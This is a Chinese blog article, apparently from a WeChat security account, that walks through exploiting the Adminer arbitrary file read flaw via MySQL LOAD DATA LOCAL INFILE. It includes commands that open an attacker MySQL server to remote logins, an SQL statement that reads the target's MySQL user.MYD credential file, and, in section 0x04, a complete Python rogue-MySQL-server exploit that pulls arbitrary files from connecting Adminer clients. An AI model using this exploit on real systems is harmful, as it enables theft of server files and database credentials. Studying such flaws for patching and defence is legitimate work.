\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/N7oMF7HxBlKSA7ktV-aykw)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

**0x01 前言**  

Adminer 是一款轻量级的 Web 端数据库管理工具，支持 MSSQL、MSSQL、Oracle、SQLite、PostgreSQL 等众多主流数据库，类似于 phpMyAdmin 的 MySQL 管理客户端，整个程序只有一个 PHP 文件，易于使用安装，支持连接远程数据库，https://github.com/vrana/adminer 。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkHagLhsiab0VNXPSqCTW93goHQZrhlGJ7Wvuys0zR8v3P5KhPy8EjvEqQ/640?wx_fmt=png)

  

**0x02 漏洞原理**

Adminer 任意文件读取漏洞其实来源于 MySQL“LOAD DATA INFILE” 安全问题，原理可参考先知社区 @mntn 写的 “通过 MySQL LOAD DATA 特性来达到任意文件读取”，Adminer4.6.3 版本中已经修复了 LOAD DATA LOCAL INFILE 问题。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkHK9TLaibGj2iaATcxuQTjS7OvicF6YQOfGf7df9OnSibvOiaibvSrPdvf3uBg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkHsUTX5LtxnvL52UN0yATx5iaiczHEfAa65e3WewBr8kPt2JLZfr3auia6A/640?wx_fmt=png)

****0x03 漏洞复现****

将我们攻击机的 MySQL 开启外链，然后执行 EXP 去读取一个不存在的文件让其报错得到绝对路径，最后再去读取数据库配置等指定文件即可，这里我随便读取的一个文件用于测试。

```
grant all privileges on \*.\* to 'root'@'%' identified by 'root' with grant option;
grant all privileges on \*.\* to 'root'@'%';    //MySQL8开启外链
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkH1WWLegNLBoGJqkY8TftWl0FRetTUJJwv1L0OgrCpVuqic8uDVs13Sicg/640?wx_fmt=png)

Adminer 连接攻击机 MySQL 数据库时的用户名、密码及数据库名可以随意输入，只要服务器 IP 对即可。

```
root@kali:/tmp# python mysql\_client.py "D:\\phpStudy\\PHPTutorial\\WWW\\av\\1.php"
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkHn8QXicFTLQjJX0p1o1ic53TY88flTvekaib1anag7WA88gmbibflbhuQKA/640?wx_fmt=png)

也可以在我们攻击机的 MySQL 创建一个新的数据库和表，然后在 Adminer 填入攻击机的 MySQL 服务器 IP、用户名、密码和刚创建的数据库名。

```
create database adminer;                //创建adminer数据库
use adminer;                            //进入adminer数据库
create table test(text text(4096));     //创建test数据表
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkHFJibnjGdHtTNlhK1yreiaRWyVPx8aEvuibbhtMVPrs2AMOxiazqbp8Mv9A/640?wx_fmt=png)

执行以下 SQL 语句即可读取指定文件并将读取到的文件内容写入到刚创建的数据表里，不过得注意一下目标机的 secure\_file\_priv 选项，当它的值为 null 时就会读取不了文件了。

```
load data local infile "D:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\data\\\\mysql\\\\user.MYD" into table test FIELDS TERMINATED BY '\\n';
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkH1UicvPial4hf0r1IISUEOj25AXKJfyTNdKiarRdCnZFwOyB2w7Lx6YtIw/640?wx_fmt=png)

```
select \* from test;        //查看test表内容
truncate table test;       //清空test表内容
drop database adminer;     //删除adminer数据库
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkHRvWNjUWicgmwSN9rl3k0UTDry9Wf5vcasGJRUuVd43Nsl14gnvlR6GQ/640?wx_fmt=png)

**0x04 利用程序**

```
#coding=utf-8 
import socket
import logging
import sys
logging.basicConfig(level=logging.DEBUG)

filename=sys.argv\[1\]
sv=socket.socket()
sv.setsockopt(1,2,1)
sv.bind(("",3306))
sv.listen(5)
conn,address=sv.accept()
logging.info('Conn from: %r', address)
conn.sendall("\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00")
conn.recv(9999)
logging.info("auth okay")
conn.sendall("\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00")
conn.recv(9999)
logging.info("want file...")
wantfile=chr(len(filename)+1)+"\\x00\\x00\\x01\\xFB"+filename
conn.sendall(wantfile)
content=conn.recv(9999)
logging.info(content)
conn.close()
```

****0x05** **参考链接****

*   https://xz.aliyun.com/t/3973
    
*   https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html
    

**【推荐书籍】**